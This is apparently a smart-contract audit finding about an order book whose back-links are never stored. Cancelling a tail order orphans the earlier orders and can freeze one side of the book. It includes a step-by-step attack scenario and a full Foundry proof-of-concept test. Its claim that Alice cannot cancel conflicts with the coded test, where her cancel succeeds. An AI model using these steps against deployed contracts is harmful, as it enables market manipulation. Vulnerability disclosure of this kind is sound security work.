  "body": "## Finding description and impact\n\nThe limit-order book stores all orders for a given price in a doubly linked list:\n\n```\nhead ──► order1 ⇄ order2 ⇄ … ⇄ tail\n```\n\nWhen a new order is appended, the contract must update both links:\n\n* `tail.next = newOrder`               (forward link)\n* `newOrder.prev = tail`               (back link)\n\nHowever, only the forward link is saved to storage; the back-link is written to a **memory copy** and discarded:\n[Book._updateLimitPostOrder](https://github.com/code-423n4/2025-07-gte-clob/blob/main/contracts/clob/types/Book.sol#L281):\n```solidity\nOrder storage tailOrder = self.orders[limit.tailOrder];\ntailOrder.nextOrderId = order.id;          // stored\norder.prevOrderId     = tailOrder.id;      // memory-only\nlimit.tailOrder       = order.id;\n```\n\nAs a result, every non-head order has `prevOrderId == 0` when later read from\nstorage.\n\n**Consequences**\n\n* Cancelling or matching a non-head order makes the removal routine believe it is the head, so it blindly moves `limit.headOrder` past the real head.\n  The earlier orders become **orphaned**:\n  – invisible to traversal, matching and user cancels\n  – still counted in `numBids/Asks`, `*_OpenInterest`\n* Attackers can repeatedly orphan liquidity to:\n  - hide rival orders and front-run flow\n  - leave corrupted price levels with `numOrders > 0` but `headOrder = 0`.\n    Once the last phantom order is deleted, `getBestBid/Ask` flips to the\n    `MAX_UINT` sentinel, breaking taker fills and freezing that side\n    of the book.\n  - inflate / deflate open-interest, leading to wrong fee accrual and possible\n  withdrawal failures.\n* The corruption persists forever because every operation is wrapped in a successful transaction;\n* After the final orphaned order is deleted (e.g. via expiry or a user-initiated cancel that happens to succeed), the RB-tree node is removed and `getBestBid/Ask` returns the `MAX_UINT` sentinel, effectively disabling taker fills for that side of the book.\n\nThis violates the intended invariant documented by the surrounding logic:\n- every order should be addressable via the limit’s `headOrder`/`tailOrder` chain, and open-interest counters must reflect *reachable* orders only.\n\nScenario based PoC(coded below):\n```solidity\n// 1. Alice places the first ask at price P (becomes head & tail)\nclob.postLimitOrder(Alice, price=P, side=SELL, amount=100);\n\n// 2. Bob appends a tiny order at the same price (tail)\nclob.postLimitOrder(Bob,   price=P, side=SELL, amount=1);\n\n// 3. Bob cancels his own order\nclob.cancel(Bob, [bobOrderId]);\n\n // The RB-tree node remains because limit.numOrders was not\n // decremented, so getBestAskPrice() still returns P for now.\n // As soon as the orphaned Alice order is later cancelled\n // (or expired), numOrders hits zero, the node is removed,\n // and getBestAskPrice() jumps to MAX_UINT.\n// Any taker FillOrKill reverts; Alice cannot cancel her order\n// (underflow when removing an already-detached head).\n```\n## Recommended mitigation steps\n\n**Persist the back-link** immediately after it is written:\n```solidity\norder.prevOrderId = tailOrder.id;                 // keep\nself.orders[order.id].prevOrderId = tailOrder.id; // new SSTORE\n```",
  "proof_of_concept": "Please replace the content of the PoC.t.sol with the following and run with `forge test --match-test test_submissionValidity --via-ir`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {PoCTestBase}          from \"./PoCTestBase.t.sol\";\nimport {ICLOB as FullICLOB}   from \"contracts/clob/ICLOB.sol\";\nimport {Side, Order, OrderId, OrderIdLib} from \"contracts/clob/types/Order.sol\";\nimport {Limit}                from \"contracts/clob/types/Book.sol\";\n\n\ncontract PoC is PoCTestBase {\n    function test_submissionValidity() external {\n        /*──────────── set-up actors & constants ────────────*/\n        address alice    = jb;     // aliases from PoCTestBase\n        address bob      = rite;\n        uint256 price    = 1 ether;        // tick-aligned\n        uint256 aliceAmt = 100 ether;      // Alice’s ask\n        uint256 bobAmt   = 100 ether;        // Bob’s ask\n\n        /*────────────── fund & deposit Token A ─────────────*/\n        // Alice\n        tokenB.mint(alice, aliceAmt);\n        vm.startPrank(alice);\n        tokenB.approve(address(accountManager), aliceAmt);\n        accountManager.deposit(alice, address(tokenB), aliceAmt);\n        vm.stopPrank();\n\n        // Bob\n        tokenB.mint(bob, bobAmt);\n        vm.startPrank(bob);\n        tokenB.approve(address(accountManager), bobAmt);\n        accountManager.deposit(bob, address(tokenB), bobAmt);\n        vm.stopPrank();\n\n        /*────────── Alice posts ask (head) ─────────────*/\n        FullICLOB.PostLimitOrderArgs memory ask1 = FullICLOB.PostLimitOrderArgs({\n            side:            Side.SELL,\n            price:           price,\n            amountInBase:    aliceAmt,\n            cancelTimestamp: type(uint32).max,\n            clientOrderId:   0,\n            limitOrderType:  FullICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        vm.prank(alice);\n        uint256 aliceOrderId = FullICLOB(abCLOB).postLimitOrder(alice, ask1).orderId;\n\n        /*────────── Bob appends ask (tail) ────────────*/\n        FullICLOB.PostLimitOrderArgs memory ask2 = FullICLOB.PostLimitOrderArgs({\n            side:            Side.SELL,\n            price:           price,\n            amountInBase:    bobAmt,\n            cancelTimestamp: type(uint32).max,\n            clientOrderId:   0,\n            limitOrderType:  FullICLOB.LimitOrderType.GOOD_TILL_CANCELLED\n        });\n        vm.prank(bob);\n        uint256 bobOrderId = FullICLOB(abCLOB).postLimitOrder(bob, ask2).orderId;\n\n        /*──── verify list intact BEFORE exploit ────*/\n        assertEq(FullICLOB(abCLOB).getNumAsks(), 2, \"numAsks pre-exploit\");\n        (, uint256 bestAskPre) = FullICLOB(abCLOB).getTOB();\n        assertEq(bestAskPre, price, \"best ask pre-exploit\");\n\n        Limit memory lim = FullICLOB(abCLOB).getLimit(price, Side.SELL);\n\n        Order memory head = FullICLOB(abCLOB).getOrder(\n            OrderId.unwrap(lim.headOrder)\n        );\n        Order memory tail = FullICLOB(abCLOB).getOrder(\n            OrderId.unwrap(lim.tailOrder)\n        );\n\n        assertEq(OrderId.unwrap(head.id),  aliceOrderId, \"head should be Alice\");\n        assertEq(OrderId.unwrap(tail.id),  bobOrderId,   \"tail should be Bob\");\n\n        assertEq(\n            OrderId.unwrap(head.nextOrderId),\n            OrderId.unwrap(tail.id),\n            \"forward link missing\"\n        );\n        assertEq(\n            OrderId.unwrap(tail.prevOrderId),\n            0,\n            \"prevOrderId is zero - bug manifests on insertion\"\n        );\n\n        /*──────── Bob cancels his tail ask ─────────*/\n\n        uint[] memory toCancel = new uint[](5);\n\n        toCancel[0] = bobOrderId;\n        vm.prank(bob);\n        FullICLOB(abCLOB).cancel(bob, FullICLOB.CancelArgs({orderIds: toCancel}));\n\n        /*──── invariants broken AFTER exploit ─────*/\n        // The price node is still in the tree, so getTOB() keeps returning `price`;\n        // the corruption is that the limit’s headOrder was nulled.\n\n        Limit memory limPost = FullICLOB(abCLOB).getLimit(price, Side.SELL);\n\n        assertEq(\n            OrderId.unwrap(limPost.headOrder),\n            0,\n            \"headOrder was zeroed - Alice order is now unreachable\"\n        );\n        assertEq(\n            limPost.numOrders,\n            1,\n            \"ghost volume still counted (should be 0 after Bobs cancel)\"\n        );\n\n        // ─── Alice cancels her (invisible) order ────────────────────────────\n        toCancel[0] = aliceOrderId;\n        vm.prank(alice);\n        FullICLOB(abCLOB).cancel(       // succeeds\n            alice,\n            FullICLOB.CancelArgs({orderIds: toCancel})\n        );\n\n        // ─── book metadata is now inconsistent ───────────────────────────────\n        // list is empty but the price-level is still in the RB-tree\n        Limit memory limFinal = FullICLOB(abCLOB).getLimit(price, Side.SELL);\n\n        assertEq(OrderId.unwrap(limFinal.headOrder), 0, \"headOrder remains zero\");\n        assertEq(limFinal.numOrders,               0, \"no orders should remain\");\n\n        (, uint256 bestAskFinal) = FullICLOB(abCLOB).getTOB();\n        // when the price level is removed the engine returns the sentinel MAX_UINT\n        assertEq(\n            bestAskFinal,\n            type(uint256).max,\n            \"TOB should be empty (MAX_UINT) once the corrupted level is deleted\"\n        );\n\n    }\n}\n\n```",
